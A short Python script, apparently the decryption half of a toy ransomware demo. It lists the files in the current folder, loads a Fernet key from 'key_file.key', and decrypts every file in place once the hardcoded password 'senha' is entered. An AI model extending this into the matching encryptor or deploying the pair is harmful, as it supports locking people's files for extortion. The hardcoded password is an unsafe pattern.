import os
from cryptography.fernet import Fernet
print("...imported libraries")

def get_file_list():
	files = []
	for file in os.listdir():
		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
			continue
		if os.path.isfile(file):
			files.append(file)

	print("The files found are:", files)
	return files

def get_key():
	with open("key_file.key", "rb") as f:
		key = f.read()
	print("...key found")
	return key

def decryption_process(files, key):
    password = input("Enter password to decrypt:")
    if password == "senha":
        print("Decryption started...")
        for file in files:
            with open(file, "rb") as f:
                content = f.read()
            decrypted_content = Fernet(key).decrypt(content)
            with open(file, "wb") as f:
                f.write(decrypted_content)
                
        print("...complete decryption")

files = get_file_list()
key = get_key()
decryption_process(files, key)